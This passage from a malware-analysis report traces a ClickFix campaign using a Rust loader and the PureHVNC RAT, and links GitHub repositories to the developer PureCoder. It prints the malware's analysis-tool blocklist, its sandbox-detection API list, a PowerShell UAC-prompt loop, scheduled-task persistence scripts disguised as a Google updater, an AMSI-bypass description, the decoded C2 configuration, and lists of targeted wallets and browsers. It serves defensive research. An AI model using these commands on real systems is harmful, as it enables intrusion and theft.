\"ksdumper.exe\", \"decoder.exe\", \"dnspy.exe\", \"dbgx.shell.exe\", \"ilspy.exe\", \"ollydbg.exe\", \"x32dbg.exe\", \"x64dbg.exe\", \"gdb.exe\", \"idaq.exe\", \"idag.exe\", \"idaw.exe\", \"ida64.exe\", \"idag64.exe\", \"idaw64.exe\", \"idaq64.exe\", \"windbg.exe\", \"immunitydebugger.exe\", \"windasm.exe\", \"scylla.exe\", \"scyllahide.exe\", \"cheatengine.exe\", \"pe-bear.exe\", \"ollyice.exe\", \"radare2.exe\", \"ghidra.exe\", \"sysanalyzer.exe\", \"xperf.exe\", \"procdump.exe\", \"dbgview.exe\", \"apimonitor.exe\", \"pe-sieve64.exe\", \"pe-sieve32.exe\", \"pe-moneta.exe\"\nThe second anti-analysis technique includes a list of API functions specifically present in Microsoft’s Windows Defender Malware Analysis Emulator. This technique addresses the differences between the Windows libraries and the virtual ones, which contain more API calls specifically related to the emulated environment.\nBlacklisted APIs:\n\"MpVmp32Entry\", \"NtControlChannel\", \"ObjMgr_ValidateVFSHandle\", \"ThrdMgr_GetCurrentThreadHandle\", \"ThrdMgr_SaveTEB\", \"ThrdMgr_SwitchThreads\", \"VFS_CopyFile\", \"VFS_DeleteFile\", \"VFS_DeleteFileByHandle\", \"VFS_FileExists\", \"VFS_FindClose\", \"VFS_FindFirstFile\", \"VFS_FindNextFile\", \"VFS_FlushViewOfFile\", \"VFS_GetAttrib\", \"VFS_GetHandle\", \"VFS_GetLength\", \"VFS_MapViewOfFile\", \"VFS_MoveFile\", \"VFS_Open\", \"VFS_Read\", \"VFS_SetAttrib\", \"VFS_SetCurrentDir\", \"VFS_SetLength\", \"VFS_UnmapViewOfFile\", \"VFS_Write\", \"MpAddToScanQueue\", \"MpCreateMemoryAliasing\", \"MpCallPostEntryPointCode\", \"MpCallPreEntryPointCode\", \"MpDispatchException\", \"MpExitThread\", \"MpFinalize\", \"MpGetCurrentThreadHandle\", \"MpGetCurrentThreadId\", \"MpGetLastSwitchResult\", \"MpGetPseudoThreadHandle\", \"MpGetSelectorBase\", \"MpGetVStoreFileHandle\", \"MpHandlerCodePost\", \"MpIntHandler\", \"MpIntHandlerParam\", \"MpIntHandlerReturnAddress\", \"MpNtdllDatatSection\", \"MpReportEvent\", \"MpReportEventEx\", \"MpReportEventW\", \"MpSehHandler\", \"MpSetSelectorBase\", \"MpStartProcess\", \"MpSwitchToNextThread\", \"MpSwitchToNextThread_WithCheck\", \"MpSwitchToNextThread_NewObjManager\", \"MpTimerEvent\", \"MpTimerEventData\", \"MpUfsMetadataOp\", \"MpValidateVFSHandle\", \"MpVmp32FastEnter\"\nIf any of those anti-analysis techniques detects that the malware is being analyzed and monitored under an emulated or sandbox environment, it will sleep for a random time between 10 to 30 minutes, by executing the command cmd /c timeout /t {random_time} >null\n, once awake, if still running in the monitored environment, it reruns the anti-analysis process, and if it is again detected, it falls into a random sleep again.\nThe Rust Loader requires that it be executed with a specific command line parameter that, if it is not present, terminates its execution. The malware retrieves the parameters passed to the process and tries to find the parameter /i:--type=renderer\n.\nAs a final anti-analysis and evasion technique, immediately following the successful decryption of its payload, the malware actively implements an AMSI bypass by injecting a hook into the native LdrLoadDll\nfunction within ntdll.dll\n. This hook intercepts attempts to load the amsi.dll\nlibrary—responsible for the Windows Anti-malware Scan Interface—and effectively prevents it from being loaded into the process. By doing so, the malware disables AMSI’s runtime scanning capabilities, thereby evading detection and analysis by security products that rely on AMSI for real-time malware inspection.\nThe malware checks if the process is not running with administrative privileges, then executes the PowerShell command below to grant the malware higher privileges.\n\"powershell\" -Command \" while ($true) { try { Start-Process -FilePath 'cmd.exe' ` -Verb runas ` -ArgumentList '/c start \"\" /B \"regsvr32.exe\" {MALWARE} /i:--type=renderer'; exit } catch {} } \"\nThis PowerShell will try to execute the malicious DLL with administrative privileges in an infinite loop until the User accepts the UAC (User Account Control) prompt. Once the prompt is accepted, the process terminates itself, and the infection continues with the one that obtained higher privileges.\nThe loader, to avoid being executed twice, creates a Mutex MistyRoseNavy\nand then executes a PowerShell command, which will maintain persistence to the system via scheduled tasks.\nThe first PowerShell command will try to see if any Scheduled Task is already registered in the system.\n\"powershell\" -Command \" if ( Get-ScheduledTask | Where-Object { $_.Actions.Execute -eq 'regsvr32' -and $_.Actions.Arguments -eq '/s /i:--type=renderer \\\"%APPDATA%\\Microsoft\\SystemCertificates\\{MALWARE}\\\"' } ) { exit 0 } else { exit 1 } \"\nIf not, it will proceed to create persistence on the infected machine. The Task name and path were made to mimic a Google Updater:\nRegister-ScheduledTask ` -Action ( New-ScheduledTaskAction ` -Execute \"regsvr32\" ` -Argument \"/s /i:--type=renderer \"%APPDATA%\\Microsoft\\SystemCertificates\\{MALWARE}\"\" ) ` -Trigger ( New-ScheduledTaskTrigger ` -Once -At (Get-Date).AddMinutes(1) ` -RepetitionInterval (New-TimeSpan -Minutes 1) ) ` -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-9A2C-41C2-B9E7-3C3C6F193A83}' ` -TaskPath '\\GoogleSystem\\GoogleUpdater' ` -Description 'GoogleUpdater Task System 196.6.2928.90' ` -Settings ( New-ScheduledTaskSettingsSet ` -AllowStartIfOnBatteries ` -DontStopIfGoingOnBatteries ` -ExecutionTimeLimit 0 ` -DontStopOnIdleEnd ) ` -RunLevel Highest\nThe execution of the above script will be performed by running it as a PowerShell over stdin, executing first the below command and writing into a Pipe WriteFileEx\nthe persistence PowerShell script.\nPowerShell.exe -NoProfile -NonInteractive -Command -\nThe payload is embedded inside the Rust binary and is decrypted using a simple XOR with a 32-byte key.\nLater, the malware will validate the decrypted value, which will determine the next step. The validation occurs by XORing the decrypted bytes and generating a hash value.\nThis hash value is further processed and compared with the value 0x6. During this function, we also observe the hexadecimal value 0xDEADBEEF\neven though it does not affect the output, which appears to be used solely as a marker.\nThe next step, the malware checks if the decrypted payload is bigger than 1 KB (1024 Bytes), and only if so, proceeds further with the infection, otherwise, it terminates itself. At this stage, the malware has already hooked LdrLoadDll\nsuccessfully bypasses AMSI loading.\nAs the last step, the Rust Loader creates a heap, copies the decrypted payload buffer into it, and executes the shellcode.\nThe buffer contains a .NET payload, which is executed via the shellcode. Once the .NET crypter decrypts the final payload using AES and decompresses it using Gzip, it is identified as PureHVNC.\nPureHVNC is a product of the Pure family of malicious software developed by PureCoder. The malware provides HVNC capabilities (Hidden Virtual Network Computing), which allows an attacker to control an infected machine without the session being visible to the infected user.\nThe analyzed malware contains obfuscated strings and function calls that are dynamically decrypted. By using NETReactorSlayer, we can obtain a cleaner version of this malware.\nThe malware configuration is protobuf serialized, Gzip compressed, and Base64 encoded. The reverse process retrieves the malware configuration, which contains execution configurations such as the command and control server, port number and mutex name.\nThe deserialization of the decompressed buffer can be done using the protod tool, which gives the following output.\nC:\\> protod --hex b202c30d0a0e35342e3139372e3134312e32343510bb0310cb511a880d4d494945346a434341737167417749424167495141504b4f6c6c78707a57456637436967326977515554414e42676b71686b69473977304241513046414441534d52417744675944565151444441645864325a7761485a694d434158445449304d446b784e5445794e4455774e316f59447a6b354f546b784d6a4d784d6a4d314f545535576a41534d52417744675944565151444441645864325a7761485a694d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454133516d2b4f345a58386537716e7a62374163532b4d4b754d6d4e616e3036486746317456337a43393274694c2f51796c43793354665a3147516d75742b634f66755a627939755941794d463734757874777046707236707a4c34707333487870757842727641635273554b56536870517a474f544d776c4a574a6a376e445831546e2f5049723967353543376a54462f6b3933677264474e333845415951536437356778685a37736464435a4675427936426474323155526b6e69704e394e33792f646c444f2b71425a6d625668474745715a31487256443252706d4b4b454f364f5a7534584a484c726e3145736a6778794d306966623750333862522f6344423250787a4f7147525a2f536e68673542772f754738322b7477596b70364378565248353979616d6c487039715246347652464c6b3038785a302b6c526b51563442724557624136306f6d4970335844646e4d4f50465a6e7148554d5442545a3837314c4537383256463334784d3551644941327236516a714e794b53796d622f6c4d634c4a45686c4a2b44456630355932306c45396e4a546e2f696f4d4b4f2f696c737a4a4f6875384e533433672b746f725043454f76446c644266787467637034772b5358584c665569332b702f3332364a5867685270715a555139395661482f756354347250394363536a49716c43796d507541684f5a6d5244794d416357757a737a2f315354675a3866785030445670726470544c764e396e2b65734d505948524543556c615a4c646e397839416d5a4152624d61744f64417a48384c675154473032656356532f70457567555667374970786e367057716a4b2b4e53464e72316b784359493555715a4b35304364494e6f4b4d382b6672413767416c336f686e593462524b366246696f61434363435a4a463746614a4a682b4544732f4351364b634c706e6b434177454141614d794d444177485159445652304f424259454642396a546c4e6561355a734a6437436c44682f6365706b46585a5a4d41384741315564457745422f7751464d414d42416638774451594a4b6f5a496876634e4151454e42514144676749424148336e466e7675504575664d334277504e6668677335526b5050586b3270473963547a6e784552336833376b52336a6775456e7132774c3779594132443330584138744a76372b43505a2f4972745343304f5379456d77386135466f48746e6f32326535447471383146593463386b465453307033396d744145746974414765684d7945364b3358304c67764e6178577762644c3972636b6f36326d7378714b527733667861466a544e4b2b746c35483654386a584835564d714564306569694b357953616e4c6b69792b4366594a6e7971426f49435957347231572f6f3635696267787a506f4f7a63626f64345547394f36597744714d444e384a6c514451546c37675a4c697443526361425a51796e494e4632795a775a5969726457714b3058336668514c6c756f5a397a58686335726233554d352b51765039702f5a61554f495a306d3138766a56636e7a365a6f394e36304b393375355a2f497a42636438674d315770336474447275656b626a64587338622b74784d4446537935365a5042464c4a68574f34787047743137325a4d7036447539734d4157446144546650765a5770724535576a436b34666c744d515530444762506d5031696c33584c7471567650694c767541636372624c39776b766c76444b676a715570596a587364464f5435756e586959633165454457344849574e4a634977324a346f7a384932416c77512b657856544541725163384733664e624d73765a4437437453564a4b715a4c536b41666f6b69335a72732f6649465447474e7a512f56626230314b376b3773326d4151344d72314a6a4e682f5a776c546475624b5a702b6a6241527268447676645049537570536f304b444b426a776b5932746347772f615473594b644e7977446e38567149764c6a4868444b4734764d6d3746596f4c4d64455749584e797650316f4a322207616d617a6f6e333a004207415050444154414a0c616130356265323835303631 [b2 02] 38 string: (1731) [0a] 1 string: (14) 54.197.141[.]245 [10] 2 varint: 443 (0x1bb) [10] 2 varint: 10443 (0x28cb) [1a] 3 string: (1672) MIIE4jCCAsqgAwIBAgIQAPKOllxpzWEf7Cig2iwQUTANBgkqhkiG9w0BAQ0FADASMRAwDgYDVQQDDAdXd2ZwaHZiMCAXDTI0MDkxNTEyNDUwN1oYDzk5OTkxMjMxMjM1OTU5WjASMRAwDgYDVQQDDAdXd2ZwaHZiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3Qm+O4ZX8e7qnzb7AcS+MKuMmNan06HgF1tV3zC92tiL/QylCy3TfZ1GQmut+cOfuZby9uYAyMF74uxtwpFpr6pzL4ps3HxpuxBrvAcRsUKVShpQzGOTMwlJWJj7nDX1Tn/PIr9g55C7jTF/k93grdGN38EAYQSd75gxhZ7sddCZFuBy6Bdt21URknipN9N3y/dlDO+qBZmbVhGGEqZ1HrVD2RpmKKEO6OZu4XJHLrn1EsjgxyM0ifb7P38bR/cDB2PxzOqGRZ/Snhg5Bw/uG82+twYkp6CxVRH59yamlHp9qRF4vRFLk08xZ0+lRkQV4BrEWbA60omIp3XDdnMOPFZnqHUMTBTZ871LE782VF34xM5QdIA2r6QjqNyKSymb/lMcLJEhlJ+DEf05Y20lE9nJTn/ioMKO/ilszJOhu8NS43g+torPCEOvDldBfxtgcp4w+SXXLfUi3+p/326JXghRpqZUQ99VaH/ucT4rP9CcSjIqlCymPuAhOZmRDyMAcWuzsz/1STgZ8fxP0DVprdpTLvN9n+esMPYHRECUlaZLdn9x9AmZARbMatOdAzH8LgQTG02ecVS/pEugUVg7Ipxn6pWqjK+NSFNr1kxCYI5UqZK50CdINoKM8+frA7gAl3ohnY4bRK6bFioaCCcCZJF7FaJJh+EDs/CQ6KcLpnkCAwEAAaMyMDAwHQYDVR0OBBYEFB9jTlNea5ZsJd7ClDh/cepkFXZZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQENBQADggIBAH3nFnvuPEufM3BwPNfhgs5RkPPXk2pG9cTznxER3h37kR3jguEnq2wL7yYA2D30XA8tJv7+CPZ/IrtSC0OSyEmw8a5FoHtno22e5Dtq81FY4c8kFTS0p39mtAEtitAGehMyE6K3X0LgvNaxWwbdL9rcko62msxqKRw3fxaFjTNK+tl5H6T8jXH5VMqEd0eiiK5ySanLkiy+CfYJnyqBoICYW4r1W/o65ibgxzPoOzcbod4UG9O6YwDqMDN8JlQDQTl7gZLitCRcaBZQynINF2yZwZYirdWqK0X3fhQLluoZ9zXhc5rb3UM5+QvP9p/ZaUOIZ0m18vjVcnz6Zo9N60K93u5Z/IzBcd8gM1Wp3dtDruekbjdXs8b+txMDFSy56ZPBFLJhWO4xpGt172ZMp6Du9sMAWDaDTfPvZWprE5WjCk4fltMQU0DGbPmP1il3XLtqVvPiLvuAccrbL9wkvlvDKgjqUpYjXsdFOT5unXiYc1eEDW4HIWNJcIw2J4oz8I2AlwQ+exVTEArQc8G3fNbMsvZD7CtSVJKqZLSkAfoki3Zrs/fIFTGGNzQ/Vbb01K7k7s2mAQ4Mr1JjNh/ZwlTdubKZp+jbARrhDvvdPISupSo0KDKBjwkY2tcGw/aTsYKdNywDn8VqIvLjHhDKG4vMm7FYoLMdEWIXNyvP1oJ2 [22] 4 string: (7) amazon3 (61 6d 61 7a 6f 6e 33) [3a] 7 string: (0) [42] 8 string: (7) APPDATA (41 50 50 44 41 54 41) [4a] 9 string: (12) aa05be285061\nThe above configuration stores values in a specific class whose properties are decorated with [ProtoMember(n)]\nattributes, indicating that it uses Protocol Buffers (protobuf-net) for serialization.\nPureHVNC, similar to the Rust Loader described above, maintains its persistence in the system’s Scheduled Task by executing a PowerShell command.\nWhen running with admin rights, the malware will execute the following script:\nRegister-ScheduledTask ` -TaskName '<task_name>' ` -Action ( New-ScheduledTaskAction -Execute '<executable_path>' ) ` -Trigger ( New-ScheduledTaskTrigger -Once -At (Get-Date) ` -RepetitionInterval (New-TimeSpan -Minutes 5) ) ` -User $env:UserName ` -**RunLevel Highest** ` -Settings ( New-ScheduledTaskSettingsSet ` -ExecutionTimeLimit (New-TimeSpan -Seconds 0) ` -AllowStartIfOnBatteries ` -DontStopIfGoingOnBatteries ) ` -Force\nWhen the process runs as a normal user, the command will run without the -RunLevel Highest\noption. Depending on the process rights, the appropriate command will be Base64 encoded and then executed using the -Enc\nPowerShell parameter.\nThe malware initially tries to check if the endpoint is currently alive, first trying to Connect\nvia socket and then sends four bytes to the C&C 04 00 00 00\n.\nThe malware creates an SSLStream and performs an SSL handshake, verifying the server’s certificate against a certificate embedded in its configuration.\nDuring this stage, PureHVNC collects Bot information that will be sent to the attacker’s server. This information will be serialized and then compressed using Gzip. If the compressed data exceeds approximately 1 MB (1,000,000 bytes), it will be sent in 16 KB chunks.\nOnce data is sent, PureHVNC receives the compressed buffer size from the C&C via an SSL stream and reads the entire buffer into an array. After decompressing and deserializing the data, the malware executes the received command in a separate thread.\nPureHVNC collects and sends data from the infected system to the C&C server. This includes installed antivirus products, bot identifier, user domain and privileges, OS version, executable filename, idle time, and installed applications of interest. The information also contains metadata such as the malware version (4.1.9\n) and campaign ID (amazon3\n) obtained from the malware configuration.\nTo retrieve the Antivirus products queries Windows Management Instrumentation (WMI) for installed antivirus products on the system, \"SELECT * FROM AntiVirusProduct”\n.\nIn addition to collecting information about installed antivirus products, the malware also checks for the presence of specific applications of interest on the host system. It scans predefined directories, files, and registry keys associated with known crypto wallet software, browser extensions, and messaging or email clients to find them (see Appendix).\nAmong the data sent to the C&C, there are three pieces of information that can also serve as anti-sandbox indicators, helping the attacker determine whether the bot resides on a real user system or within a sandboxed or virtualized analysis environment.\nThe first technique returns a Boolean value indicating whether the infected machine has any devices recognized as cameras or imaging devices. This is determined by executing the WMI query, SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\n. Sandboxes and virtual machines often lack physical devices like webcams or imaging devices, and the absence of such devices can indicate a non-physical environment.\nThe second collected data retrieves the tick count of the last input event (keyboard/mouse) and the last user activity on the machine. The third one is the executable name and path, that during this campaign the malware was installed in a fixed folder. This three information combined could be used by the attacker to determine whether the infected machine is a real user or not.\nPureHVNC stores plugins inside the registry key. The registry key uses the BotID, while the name and value are received by the C&C. The data of the plugin is compressed and reversed, and each time the plugin is loaded, it reverses the bytes and decompresses the buffer. The registry path is located at HKEY_CURRENT_USER\\Software\\{BOT_ID}\nand the Bot ID is generated with the following Python logic:\n# PureHVNC BotID generation logic import hashlib class PureBotID: def __init__(self, user_name: str, domain_name: str, processor_id: str, drive_sn: str, memory_sn: str): # Environment.UserName self.user_name = user_name # Environment.UserDomainName self.domain_name = domain_name # \"Win32_Processor\", \"ProcessorId\" self.processor_id = processor_id # \"Win32_DiskDrive\", \"SerialNumber\" self.drive_sn = drive_sn # \"Win32_PhysicalMemory\", \"SerialNumber\" self.memory_sn = memory_sn # generating Bot ID PureHVNC logic self.bot_id = self.generate_bot_id() def generate_bot_id(self) -> str: user_domain = f\"{self.user_name}[{self.domain_name}]\" if self.domain_name else self.user_name result = f\"{self.processor_id}{self.drive_sn}{self.memory_sn}{self.domain_name}{user_domain}\" return hashlib.md5(result.encode()).hexdigest().upper()\nOnce the plugin is delivered to the infected victim, the threat actor can execute various commands. The majority of the commands have a one-on-one relation with the plugin, meaning that the plugin serves only one functionality, though some plugins serve multiple commands. Observed Plugins & supported Commands:\nThe Pure family of products includes multiple types of malware that are developed and sold by the same author, PureCoder. The list of products includes:\nMultiple threat actors use those products for specific purposes. Often, PureCrypter is used as a crypter, obfuscating other Pure products, such as PureLogs or PureHVNC. The products are sold among the many PureCoder’s Telegram channels.\nThe developer and seller of the Pure malware family demonstrates the features and capabilities of each product, while the PureRAT administration-builder panel appears to support three main languages: English, Russian, and Chinese.\nDuring the previously mentioned campaign, with ID amazon3\n, the malware communicated with its command and control server. The bot received three GitHub URLs and downloaded the corresponding files.\nThe GitHub account owns a total of five repositories, which contain several executable and plugin files.\nWhen examining the commits of the repository DFfe9ewf/test3\nwe discovered something that we did not expect. The commits and file uploads to the specific repository were made by “another account”, PureCoder. Mentioned commits:\n================================================== [2024-10-31T02:01:36Z] Author: PureCoder tree 795fba180464a965f99fc2a50c5a3fad38a6939a author PureCoder <[email protected]> 1730340096 +0300 committer GitHub <[email protected]> 1730340096 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 ================================================== [2024-10-31T02:02:22Z] Author: PureCoder tree 8c302d85720b3fa2a8ecceffe1aa7cd23efbe9b5 parent 647343bed2af6e8c16f296d626d98cdfd0f84cf0 author PureCoder <[email protected]> 1730340142 +0300 committer GitHub <[email protected]> 1730340142 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * msedgedriver.exe - 7b133998e526b3bee151329171c82ca1837c86f9 ================================================== [2024-10-31T02:02:40Z] Author: PureCoder tree 4b0fa1d022d409825bb2a872e245ebc9b2bcaff2 parent f388ef87fcd48a2fe00fa449c1987115e5fe35c8 author PureCoder <[email protected]> 1730340160 +0300 committer GitHub <[email protected]> 1730340160 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - 2e5050c50d3a8e9f376f0ae9394cf265ed3dcf06 * msedgedriver.exe - 7b133998e526b3bee151329171c82ca1837c86f9\nGitHub creates a noreply email shown in the commits with the ID and the Username of the account in the form [email protected]\n. The ID 87261126\nactually, currently corresponds to DFfe9ewf\nwhich was renamed from PURE-CODER-1\n. The commits have been made from the timezone UTC+0300\nwhich corresponds to many countries, including Russia, among others.\nOne of the three downloaded files was once again seen in another GitHub account, which possibly serves for development and testing purposes.\nThe repository containing those files, DemoThing\nwas created in March 2024, two more repositories with the description “PR” were created by this testing account during April 2025 and contain similar files.\nSimilar to the previous GitHub account, all commits are once again made in the timezone UTC+0300\nand contain similar names and files hosted. This account was created testdemo345\nwas created before DFfe9ewf\nand appears to be serving for testing purposes during development phases.\n-------------------------------------------------- Repository Commits: Demothing ================================================== [2024-03-03T15:38:21Z] Author: testdemo345 tree 7f851ca85ec9136486692f283ff16c79a1a211ca author testdemo345 <[email protected]> 1709480301 +0300 committer GitHub <[email protected]> 1709480301 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - 03d1d4a02fbd4c72b8ea9826a219a0511a62a974 * msedgedriver.exe - 44ceaa27e81a9a9f218fff2c720b72390ff1c6c3 -------------------------------------------------- Repository Commits: uhewrf90 ================================================== [2025-04-14T08:00:34Z] Author: testdemo345 tree 11e0357a36bd6e908cf9f6e7834cc201a70d692a author testdemo345 <[email protected]> 1744617634 +0300 committer GitHub <[email protected]> 1744617634 +0300 Add files via upload * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 ================================================== [2025-04-14T08:00:53Z] Author: testdemo345 tree 4cf36f75defc34cbd1b50c23e932f8d9a87dca9b parent 98ac16ba3e512e495ebf8da7e1ea6bea904ea69b author testdemo345 <[email protected]> 1744617653 +0300 committer GitHub <[email protected]> 1744617653 +0300 Add files via upload * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 * msedgedriver.exe - d4fff01e37aff04bf8d4314833c8a5ab9e23aca7 ================================================== [2025-04-14T08:01:08Z] Author: testdemo345 tree 831bcb77a070b342115c68ced7cb22c0c778006f parent 564db1627658feb61fe87b07659d371c371a4a41 author testdemo345 <[email protected]> 1744617668 +0300 committer GitHub <[email protected]> 1744617668 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 * msedgedriver.exe - d4fff01e37aff04bf8d4314833c8a5ab9e23aca7 -------------------------------------------------- Repository Commits: fdsgb890ugrds ================================================== [2025-04-14T08:04:51Z] Author: testdemo345 tree 85e444601df3b756209667504c39116a60e0e3d3 author testdemo345 <[email protected]> 1744617891 +0300 committer GitHub <[email protected]> 1744617891 +0300 Add files via upload * qbittorrent - 7075fb417919b4ae9335ee7abeb9553953c8aac8\nAt the beginning, we considered the contacted GitHub account (DFfe9ewf\n/PURE-CODER-1\n) as part of the URL delivered by the threat actor, who can be simply a customer of Pure malware products. Though this hypothesis changed once we discovered a PureRAT Administration-Builder containing hardcoded the GitHub URLs supporting various functionalities of the malware itself.\nThe GitHub URLs were hardcoded into the PureRAT administration-builder executable, meaning they were not delivered by the threat actor to the victims. Instead, they are part of the administration tool itself, developed by PureCoder.\nThese URLs and files appear to support the TwitchBot\nand YoutubeBot\nplugins. They are used for commands such as following or unfollowing accounts, liking videos, and clicking ads on specified videos on these platforms.\nWhile PureCoder currently uses GitHub and the above-mentioned accounts to host files that support various functionalities of PureRAT, Check Point Research expects these URLs to change more frequently, potentially using different GitHub accounts, alternative hosting platforms, or even being delivered directly as bytes to the bots by the administration tool.\nWhile the tool we obtained appears to be PureRAT builder and administration software, some available features are related to the PureCrypter software solution sold and developed by PureCoder as well.\nThe code specifies multiple enumerations (enum) related to PureCrypter. An enum is a list of named constants that represent specific values.\nPureCrypter enums:\nThese enums give us some important information regarding the choices a threat actor can make during encrypting their malware using PureCrypter. For example, we can observe the installation options (PureCrypterFolder\n), the persistence mechanism (PureCrypterStartup\n) as well as the execution method (PureCrypterInjection\n).\nThe forensic investigation of the ClickFix campaign provides a comprehensive view of the Pure malware ecosystem and its operational mechanics. The eight-day intrusion highlighted the coordinated use of multiple tools, including Rust Loader, PureHVNC RAT, and the Sliver C2 framework, demonstrating the threat actor’s sophistication. Check Point Research’s in-depth analysis of PureHVNC RAT, including all its commands, plugins, and associated supporting files, sheds light on previously opaque aspects of this malware family.\nSignificantly, the investigation linked several GitHub repositories directly to the developer, PureCoder, offering rare insights into their operational practices, including a UTC+0300 timezone and potential geographic locations. The discovery of the PureRAT builder and additional information on PureCrypter further illustrate the modular and evolving nature of this malware suite, emphasizing the ongoing threat posed by Pure malware to organizations globally.\nOverall, this research not only enhances understanding of the Pure malware family but also provides actionable intelligence that can assist cybersecurity professionals and law enforcement agencies in tracking and mitigating future campaigns conducted by both PureCoder and the cybercriminals leveraging their tools.\nCheck Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.\nTargeted Chromium extensions:\nibnejdfjmmkpcnlpebklmnkoeoihofec - TronLink nkbihfbeogaeaoehlefnkodbefgpgknn - MetaMask fhbohimaelbohpjbbldcngcnapndodjp - Binance Chain Wallet ffnbelfdoeiohenkjibnmadjiehjhajb - Yoroi cjelfplplebdjjenllpjcblmjkfcffne - Jaxx Liberty fihkakfobkmkjojpchpfgcmhfjnmnfpi - BitApp Wallet kncchdigobghenbbaddojjnnaogfppfj - iWallet aiifbnbfobpmeekipheeijimdpnlpgpp - Terra Station ijmpgkjfkbfhoebgogflfebnmejmfbml - BitClip blnieiiffboillknjnepogjhkgnoapac - EQUAL Wallet amkmjjmmflddogmhpjloimipbofnfjih - Wombat jbdaocneiiinmjbjlgalhcelgbejmnid - Nifty Wallet afbcbjpbpfadlkmhmclhkeeodmamcflc - Math Wallet hpglfhgfnhbgpjdenjgmdgoeiappafln - Guarda aeachknmefphepccionboohckonoeemg - Coin98 Wallet imloifkgjagghnncjkhggdhalmcnfklk - Trezor Password Manager oeljdldpnmdbchonielidgobddffflal - EOS Authenticator gaedmjdfmmahhbjefcbgaolhhanlaolb - Authy ilgcnhelpchnceeipipijaljkblbcobl - GAuth Authenticator bhghoamapcdpbohphigoooaddinpkbai - Authenticator mnfifefkajgofkcjkemidiaecocnkjeh - TezBox dkdedlpgdmmkkfjabffeganieamfklkm - Cyano Wallet aholpfdialjgjfhomihkjbmgjidlcdno - Exodus Web3 jiidiaalihmmhddjgbnbgdfflelocpak - BitKeep hnfanknocfeofbddgcijnmhnfnkdnaad - Coinbase Wallet egjidjbpglichdcondbcbdnbeeppgdph - Trust Wallet hmeobnfnfcmdkdcmlblgagmfpfboieaf - XDEFI Wallet bfnaelmomeimhlpmgjnjophhpkkoljpa - Phantom fcckkdbjnoikooededlapcalpionmalo - MOBOX WALLET bocpokimicclpaiekenaeelehdjllofo - XDCPay flpiciilemghbmfalicajoolhkkenfel - ICONex hfljlochmlccoobkbcgpmkpjagogcgpk - Solana Wallet cmndjbecilbocjfkibfbifhngkdmjgog - Swash cjmkndjhnagcfbpiemnkdpomccnjblmj - Finnie dmkamcknogkgcdfhhbddcghachkejeap - Keplr kpfopkelmapcoipemfendmdcghnegimn - Liquality Wallet hgmoaheomcjnaheggkfafnjilfcefbmo - Rabet fnjhmkhhmkbjkkabndcnnogagogbneec - Ronin Wallet klnaejjgbibmhlephnhpmaofohgkpgkd - ZilPay ejbalbakoplchlghecdalmeeeajnimhm - MetaMask ghocjofkdpicneaokfekohclmkfmepbp - Exodus Web3 heaomjafhiehddpnmncmhhpjaloainkn - Trust Wallet hkkpjehhcnhgefhbdcgfkeegglpjchdc - Braavos Smart Wallet akoiaibnepcedcplijmiamnaigbepmcb - Yoroi djclckkglechooblngghdinmeemkbgci - MetaMask acdamagkdfmpkclpoglgnbddngblgibo - Guarda Wallet okejhknhopdbemmfefjglkdfdhpfmflg - BitKeep mijjdbgpgbflkaooedaemnlciddmamai - Waves Keeper\nTargeted Applications:\nChromium - Chromium\\\\User Data\\\\ Chrome - Google\\\\Chrome\\\\User Data\\\\ Chrome - Google(x86)\\\\Chrome\\\\User Data\\\\ Brave - BraveSoftware\\\\Brave-Browser\\\\User Data\\\\ Edge - Microsoft\\\\Edge\\\\User Data\\\\ QQBrowser - Tencent\\\\QQBrowser\\\\User Data\\\\ ChromePlus - MapleStudio\\\\ChromePlus\\\\User Data\\\\ Iridium - Iridium\\\\User Data\\\\ 7Star - 7Star\\\\7Star\\\\User Data\\\\ CentBrowser - CentBrowser\\\\User Data\\\\ Chedot - Chedot\\\\User Data\\\\ Vivaldi - Vivaldi\\\\User Data\\\\ Kometa - Kometa\\\\User Data\\\\ Elements - Elements Browser\\\\User Data\\\\ Epic Privacy - Epic Privacy Browser\\\\User Data\\\\ Uran - uCozMedia\\\\Uran\\\\User Data\\\\ Sleipnir5 - Fenrir Inc\\\\Sleipnir5\\\\setting\\\\modules\\\\ChromiumViewer\\\\ Citrio - CatalinaGroup\\\\Citrio\\\\User Data\\\\ Coowon - Coowon\\\\Coowon\\\\User Data\\\\ liebao - liebao\\\\User Data\\\\ QIP Surf - QIP Surf\\\\User Data\\\\ Orbitum - Orbitum\\\\User Data\\\\ Dragon - Comodo\\\\Dragon\\\\User Data\\\\ Amigo - Amigo\\\\User\\\\User Data\\\\ Torch - Torch\\\\User Data\\\\ Comodo - Comodo\\\\User Data\\\\ 360Browser - 360Browser\\\\Browser\\\\User Data\\\\ Maxthon3 - Maxthon3\\\\User Data\\\\ K-Melon - K-Melon\\\\User Data\\\\ Sputnik - Sputnik\\\\Sputnik\\\\User Data\\\\ Nichrome - Nichrome\\\\User Data\\\\ CocCoc - CocCoc\\\\Browser\\\\User Data\\\\ Uran - Uran\\\\User Data\\\\ Chromodo - Chromodo\\\\User Data\\\\ Atom - Mail.Ru\\\\Atom\\\\User Data\\\\ Atomic Wallet Bitcoin-Qt Dash-Qt Electrum Ethereum Exodus Jaxx Litecoin-Qt Zcash Foxmail Telegram Ledger Live", "timestamp": "2025-10-21T13:36:00.278979"}
